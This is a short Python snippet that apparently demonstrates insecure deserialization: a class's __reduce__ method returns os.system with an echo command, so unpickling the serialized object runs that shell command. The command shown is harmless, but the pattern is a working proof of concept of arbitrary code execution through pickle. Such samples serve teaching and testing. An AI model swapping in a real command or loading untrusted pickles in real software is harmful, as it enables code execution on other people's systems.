import pickle
import os

class VulnerableClass:
    def __reduce__(self):
        return (os.system, ('echo "You have been hacked"',))

data = pickle.dumps(VulnerableClass())
pickle.loads(data)
